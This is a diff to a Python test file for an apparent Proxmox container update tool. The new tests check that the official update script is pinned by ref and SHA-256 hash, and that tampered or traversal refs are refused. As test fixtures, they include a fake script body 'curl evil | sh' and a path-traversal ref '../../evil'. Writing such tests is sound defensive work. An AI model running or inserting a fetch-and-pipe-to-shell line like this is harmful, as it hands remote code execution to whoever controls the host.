@@ -377,7 +377,7 @@ def chain_env(monkeypatch, fail=(), inventory=INVENTORY):
     """Fake the host: containers 101 and 102 run, every command goes through stream_process and is recorded."""
     commands = docker_env(monkeypatch, inventory=inventory, fail=fail)
     monkeypatch.setattr(c, "list_containers", lambda: [("101", "running", "a"), ("102", "running", "b")])
-    monkeypatch.setattr(c, "fetch_update_apps_script", lambda: "echo update")
+    monkeypatch.setattr(c, "fetch_update_apps_script", lambda ref="main": "echo update")
     monkeypatch.setattr(c, "pct_exec", lambda ctid, script, timeout=120: (0, inventory))
     return commands
 
@@ -546,3 +546,27 @@ def test_every_request_to_the_service_announces_the_collector_version(monkeypatc
     monkeypatch.setattr(c.urllib.request, "urlopen", lambda req, timeout=None: seen.append(dict(req.header_items())) or Reply())
     c.server_call({"server_url": "http://x", "token": "t"}, "GET", "/api/jobs/pending")
     assert seen[0]["X-collector-version"] == c.VERSION and seen[0]["Authorization"] == "Bearer t"
+
+
+# ---------------------------------------------------------------- the official update script
+
+def test_the_official_script_is_named_with_its_version_and_hash(monkeypatch):
+    import hashlib
+    urls = []
+    monkeypatch.setattr(c, "cached_fetch", lambda url, ttl, token=None: urls.append(url) or "echo update")
+    digest = hashlib.sha256(b"echo update").hexdigest()
+    shipper = Shipper()
+    assert c.official_update_script({}, shipper) == "echo update"
+    assert "/main/tools/pve/update-apps.sh" in urls[0] and f"at main, sha256 {digest}" in shipper.text
+    assert c.official_update_script({"scripts_ref": "a1b2c3d", "update_apps_sha256": digest.upper()}, Shipper())
+    assert "/a1b2c3d/tools/pve/update-apps.sh" in urls[1]
+
+
+def test_an_official_script_that_changed_or_a_bad_ref_is_refused(monkeypatch):
+    monkeypatch.setattr(c, "cached_fetch", lambda url, ttl, token=None: "curl evil | sh")
+    shipper = Shipper()
+    assert c.official_update_script({"update_apps_sha256": "0" * 64}, shipper) is None and "Refused" in shipper.text
+    assert c.official_update_script({"scripts_ref": "../../evil"}, Shipper()) is None
+    monkeypatch.setattr(c, "list_containers", lambda: [("100", "running", "a")])
+    results = c.update_apps({"ctids": [100]}, {"update_apps_sha256": "0" * 64}, Shipper())
+    assert results == [{"label": "update-apps.sh", "ok": False, "message": c.SCRIPT_UNAVAILABLE}]
